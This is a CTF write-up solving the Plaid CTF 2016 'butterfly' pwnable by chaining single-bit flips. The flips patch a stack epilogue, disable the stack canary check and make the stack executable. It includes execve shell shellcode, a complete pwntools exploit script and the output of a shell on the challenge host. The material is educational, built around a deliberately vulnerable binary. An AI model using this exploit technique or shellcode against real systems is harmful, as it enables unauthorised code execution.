# Plaid CTF 2016: butterfly

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| Plaid CTF | butterfly | Pwnable | 150 |

### Description
> Sometimes [the universe smiles upon you](challenge). And sometimes, well, you just have to roll your sleeves up and do things yourself. Running at butterfly.pwning.xxx:9999 

## Write-up

We're given the following executable:

```bash
file butterfly
butterfly; ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped

./checksec.sh --file butterfly 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   butterfly
```

Which has the following decompilation in IDA:

```c
 bint = strtol(&buffer, 0LL, 0);
    bint2 = bint;
    v6 = (_BYTE *)(bint >> 3);
    mprotaddr = (void *)((bint >> 3) & 0xFFFFFFFFFFFFF000LL);
    if ( mprotect(mprotaddr, 0x1000uLL, 7) )    // PROT_READ | PROT_WRITE | PROT_EXEC
    {
      perror("mprotect1");
    }
    else
    {
      v3 = 1;
      *v6 ^= 1 << (bint2 & 7);
      if ( mprotect(mprotaddr, 0x1000uLL, 5) )  // PROT_READ | PROT_EXEC
      {
        perror("mprotect2");
      }
      else
      {
        puts("WAS IT WORTH IT???");
        v3 = 0;
      }
```

So what we have here is a situation where we can determine an address where the corresponding memory page will be made readable, writable and executable (RWX) and at that address a single bit of our choice will be flipped after which the page will be made readable and executable only (RX). The idea, as hinted by the challenge description, is akin to God hitting the executable with a cosmic ray that flips a single bit somewhere and using that we need to achieve arbitrary code execution.

The scenario we will try to achieve is to put the following shellcode:

```c
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
```

### Crafting the bit-flipping exploit primitive

On the stack, make sure the stack is RWX and transfer control-flow to the stack. There are various natural targets for bit-flipping but our first target for our 'cosmic ray' will be the stackframe unwinding instruction in the function epilogue:

```asm
0x400860                 add     rsp, 48h
```

Which we will turn into
```
0x400860                 add     rsp, 08h
```

If we do this the epilogue will not properly unwind the stackframe and values from our buffer will be popped into the registers and eventually also end up as the return address picked by the `retn` instruction. As a result we will be able to hijack control-flow with our buffer whenever we execute the main function. The 'cosmic ray' to achieve this is:

```c
((0x400863 << 3) | 6) = 33571614
```

Where `0x400863` is the target address and `6` the bit index we wish to flip. Our buffer would look like:

`33571614AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE`

where `EEEEEEEE = return address`.

We will pick the main function start address `0x400788` as our return address so we can execute the bitflipping exercise again but this time with the modified epilogue. This effectively gives us a situation where we can flip arbitrary bits in the program and redirect control-flow afterwards, a pretty powerful exploitation primitive.

### Crafting a shellcode dispatcher

Now we want a way to redirect control-flow to our shellcode which will be placed on the stack eventually. Since ASLR is enabled and we cannot leak memory addresses we will need (to craft) a `jmp rsp / call rsp` instruction in our code. Looking at the executable code we find:

```asm
  00000000004006E5                 jmp     rax
```

We can XOR this with 4 to craft a jmp rsp instruction which gives our second 'cosmic ray':

```c
((0x4006E6 << 3) | 2) = 33568562
```

We redirect to the function start again.

### Getting rid of the stack cookie check

Let's get rid of that stack cookie check restricting our ability to juggle and mess with the stack first before it becomes a problem:

```asm
  .text:000000000040085B                 jnz     short loc_400883
  .text:000000000040085D                 mov     eax, r14d
```

This translates to opcodes:

```
75 26 44 89 F0
```

If we XOR the first byte with 0x40 we can turn this into

```
35 26 44 89 F0
```

Which is the instruction

```asm
xor eax, 0xF0894426
```

Thus taking care of that conditional jump and hence avoiding the consequences of messing with the stack cookie.

### Giving ourselves some buffer space for shellcode

Our buffer is limited to 50 bytes and while it is probably possible to craft shellcode fitting in there together with the target address representation and return address we will give ourselves a little space by bitflipping the number of bytes `fgets` will read from input so that we can specify larger shellcodes:

```asm
.text:00000000004007C3                 mov     esi, 32h        ; n
```

Which we XOR with 0x40 so that we now read `0x72` bytes (giving us `0x40` bytes extra).

### Modifying the second mprotect call

Before we can make the stack RWX we will need to modify the second mprotect call since otherwise the stack will be made RX only (and non-writable) by the second mprotect call which is a problem for obvious reasons. We target the protection-flag setting instruction:

```asm
  .text:000000000040082F                 mov     edx, 5          ; prot
```

By turning it into:

```asm
mov edx, 7
```

As a result the second mprotect call will also set RWX protections and won't bother us.

### Making the stack RWX

When calling the `mprotect` function the application uses the `r15` register to specify the target modification address (from which the page address is derived). We flip a single bit here again to make sure `mprotect` is called over the stack rather than any address we specify:

```asm
  .text:00000000004007EF                 mov     r15, rbp
```

And turn it into:

```asm
mov r15, rsp
```

We redirect to the function start again and this time the mprotect call(s) will make the stack RWX. Keep in mind, however, that the address we specify will no longer be made writable so specify a scratch address somewhere in the `.data` section (which is writable) so the bitflipping code won't cause problems. After this we redirect once again to the function start.

### Supplying the shellcode

Finally we will supply the shellcode and an appropriate return address, together with the same scratch address, to the buffer so that the shellcode gets read to the (now RWX) stack, the function epilogue returns to an address of our choice (the crafted `jmp rsp`) and execution is redirected to our shellcode. Keep in mind, however, since our shellcode is located on the stack that we might want to start the shellcode off with some stackpointer adjustment to prevent any pushes and pops in there from becoming a self-modifying mess.

The [complete exploit](solution/butterfly_sploit.py) looks as follows:

```python
#!/usr/bin/env python
#
# Plaid CTF 2016
# butterfly (CRYPTO/200)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack, unpack

shellcode = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

host = 'butterfly.pwning.xxx'
port = 9999

function_start_addr = 0x400788
rsp_adjust_addr = 0x400863
jmp_rax_addr = 0x4006E6
jnz_stckchk_addr = 0x40085B
fgets_cnt_addr = 0x4007C4
mov_edx_5_addr = 0x400830
mov_r15_rbp_addr = 0x4007F1
scratch_addr = 0x600D10

jmp_rsp = 0x4006E5
padding = "\x90" * 32
adjust_rsp_instr = "\x48\x83\xEC\x60"

pop_rbx = 'A'*8
pop_r14 = 'B'*8
pop_r15 = 'C'*8
pop_rbp = 'D'*8

cosmic_ray_0 = str(((rsp_adjust_addr << 3) | 6)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_1 = str(((jmp_rax_addr << 3) | 2)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_2 = str(((jnz_stckchk_addr << 3) | 6)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_3 = str(((fgets_cnt_addr << 3) | 6)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_4 = str(((mov_edx_5_addr << 3) | 1)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_5 = str(((mov_r15_rbp_addr << 3) | 3)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)
cosmic_ray_6 = str(((scratch_addr << 3) | 1)) + pop_rbx + pop_r14 + pop_r15 + pop_rbp + pack('<Q', function_start_addr)

h = remote(host, port, timeout = None)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_0)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_1)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_2)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_3)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_4)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_5)
h.recvuntil('COSMIC RAY?\n')
h.sendline(cosmic_ray_6)
h.recvuntil('COSMIC RAY?\n')

h.sendline(str(((scratch_addr << 3) | 1)) + padding + pack('<Q', jmp_rsp) + adjust_rsp_instr + shellcode)

print h.interactive()
```

And when executed:

```bash
$ ./butterfly_sploit.py
[+] Opening connection to butterfly.pwning.xxx on port 9999: Done
[*] Switching to interactive mode
WAS IT WORTH IT???
$ id
uid=1001(problem) gid=1001(problem) groups=1001(problem)
$ ls -la
total 28
drwxr-x--- 2 root problem 4096 Apr 15 21:49 .
drwxr-xr-x 4 root root    4096 Apr 15 17:50 ..
-rwxr-xr-x 1 root root    8328 Apr 15 18:26 butterfly
-r--r----- 1 root problem   28 Apr 15 18:28 flag
-rwxr-xr-x 1 root root     219 Apr 15 21:49 wrapper
$ cat flag
PCTF{b1t_fl1ps_4r3_0P_r1t3}
```